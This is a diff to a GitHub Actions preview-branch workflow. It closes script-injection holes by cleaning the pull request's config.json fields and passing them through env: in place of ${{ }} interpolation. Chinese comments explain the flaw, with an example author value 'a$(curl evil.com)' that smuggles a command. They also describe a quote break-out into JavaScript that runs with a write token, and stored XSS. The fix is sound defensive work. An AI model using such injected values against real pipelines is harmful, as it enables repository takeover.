@@ -83,11 +83,23 @@ jobs:
           echo "config.json found:"
           cat config.json
           
-          AUTHOR=$(python3 -c "import json; print(json.load(open('config.json')).get('author',''))" 2>/dev/null)
-          NAME=$(python3 -c "import json; print(json.load(open('config.json')).get('name',''))" 2>/dev/null)
-          BRANCH=$(python3 -c "import json; print(json.load(open('config.json')).get('branch',''))" 2>/dev/null)
-          DESCRIPTION=$(python3 -c "import json; print(json.load(open('config.json')).get('description',''))" 2>/dev/null)
-          VERSION=$(python3 -c "import json; print(json.load(open('config.json')).get('version','1.0.0'))" 2>/dev/null)
+          # ★★ config.json 由 PR 提交者完全控制，而这些值会流向三个危险位置：
+          #   1. git 分支名（preview/<author>/<branch>）
+          #   2. preview-branches.json —— 被官网"版本广场"渲染（曾经不转义 → 存储型 XSS）
+          #   3. 下游 run: 脚本和 github-script 的 JS 字符串
+          #
+          #   早期版本把 "${{ steps.validate.outputs.author }}" 直接插进 run: 脚本。
+          #   GitHub 的 ${{ }} 是在 bash 执行**之前**做文本替换，
+          #   双引号挡不住命令替换：author 写成 a$(curl evil.com) 就会被执行。
+          #   现在改成两步：这里先白名单清洗，下游一律走 env:（不再文本插值）。
+          clean() { printf '%s' "$1" | tr -d '\r\n' | sed 's/[^a-zA-Z0-9_.-]/-/g'; }
+          safe()  { printf '%s' "$1" | tr -d '\r\n'; }
+
+          AUTHOR=$(clean "$(python3 -c "import json; print(json.load(open('config.json')).get('author',''))" 2>/dev/null)")
+          BRANCH=$(clean "$(python3 -c "import json; print(json.load(open('config.json')).get('branch',''))" 2>/dev/null)")
+          NAME=$(safe "$(python3 -c "import json; print(json.load(open('config.json')).get('name',''))" 2>/dev/null)")
+          DESCRIPTION=$(safe "$(python3 -c "import json; print(json.load(open('config.json')).get('description',''))" 2>/dev/null)")
+          VERSION=$(safe "$(python3 -c "import json; print(json.load(open('config.json')).get('version','1.0.0'))" 2>/dev/null)")
           
           if [ -z "$AUTHOR" ] || [ -z "$NAME" ] || [ -z "$BRANCH" ]; then
             echo "::error::config.json must contain 'author', 'name', and 'branch' fields"
@@ -103,13 +115,20 @@ jobs:
 
       - name: Create preview branch
         if: github.event.action != 'closed' && steps.check_config.outputs.has_config == 'true' && success()
+        env:
+          AUTHOR: ${{ steps.validate.outputs.author }}
+          BRANCH: ${{ steps.validate.outputs.branch }}
         run: |
-          AUTHOR="${{ steps.validate.outputs.author }}"
-          NAME="${{ steps.validate.outputs.name }}"
-          BRANCH="${{ steps.validate.outputs.branch }}"
-          
-          SANITIZED_BRANCH=$(echo "$BRANCH" | sed 's/[^a-zA-Z0-9_-]/-/g')
-          PREVIEW_BRANCH="preview/${AUTHOR}/${SANITIZED_BRANCH}"
+          set -euo pipefail
+          # 值来自 env，不经过 ${{ }} 文本插值 —— 命令替换无从下手。
+          # 这里再清洗一次：分支名要作为 git ref，不能含空格/引号/.. 等。
+          SANITIZED_AUTHOR=$(printf '%s' "$AUTHOR" | tr -d '\r\n' | sed 's/[^a-zA-Z0-9_.-]/-/g')
+          SANITIZED_BRANCH=$(printf '%s' "$BRANCH" | tr -d '\r\n' | sed 's/[^a-zA-Z0-9_.-]/-/g')
+          if [ -z "$SANITIZED_AUTHOR" ] || [ -z "$SANITIZED_BRANCH" ]; then
+            echo "::error::author/branch 清洗后为空，拒绝创建预览分支"
+            exit 1
+          fi
+          PREVIEW_BRANCH="preview/${SANITIZED_AUTHOR}/${SANITIZED_BRANCH}"
           
           echo "Creating preview branch: $PREVIEW_BRANCH"
           
@@ -125,13 +144,22 @@ jobs:
       - name: Update preview branches registry on main
         if: github.event.action != 'closed' && steps.check_config.outputs.has_config == 'true' && success()
         uses: actions/github-script@v7
+        env:
+          AUTHOR: ${{ steps.validate.outputs.author }}
+          NAME: ${{ steps.validate.outputs.name }}
+          BRANCH: ${{ steps.validate.outputs.branch }}
+          DESCRIPTION: ${{ steps.validate.outputs.description }}
+          VERSION: ${{ steps.validate.outputs.version }}
         with:
           script: |
-            const author = '${{ steps.validate.outputs.author }}';
-            const name = '${{ steps.validate.outputs.name }}';
-            const branch = '${{ steps.validate.outputs.branch }}';
-            const description = '${{ steps.validate.outputs.description }}';
-            const version = '${{ steps.validate.outputs.version }}';
+            // ★ 从 env 读，而不是 ${{ }} 插进 JS 源码。
+            //   author 里放一个单引号就能闭合 'xxx' 字符串、接着写任意 JS，
+            //   而这一步拿着有 contents:write 的 token。
+            const author = process.env.AUTHOR || '';
+            const name = process.env.NAME || '';
+            const branch = process.env.BRANCH || '';
+            const description = process.env.DESCRIPTION || '';
+            const version = process.env.VERSION || '1.0.0';
             const previewBranch = `preview/${author}/${branch.replace(/[^a-zA-Z0-9_-]/g, '-')}`;
             
             // 获取当前 preview-branches.json
@@ -194,11 +222,15 @@ jobs:
       - name: Comment success on PR
         if: github.event.action != 'closed' && steps.check_config.outputs.has_config == 'true' && success()
         uses: actions/github-script@v7
+        env:
+          AUTHOR: ${{ steps.validate.outputs.author }}
+          NAME: ${{ steps.validate.outputs.name }}
+          BRANCH: ${{ steps.validate.outputs.branch }}
         with:
           script: |
-            const author = '${{ steps.validate.outputs.author }}';
-            const name = '${{ steps.validate.outputs.name }}';
-            const branch = '${{ steps.validate.outputs.branch }}';
+            const author = process.env.AUTHOR || '';
+            const name = process.env.NAME || '';
+            const branch = process.env.BRANCH || '';
             const previewBranch = `preview/${author}/${branch.replace(/[^a-zA-Z0-9_-]/g, '-')}`;
             
             const comment = `
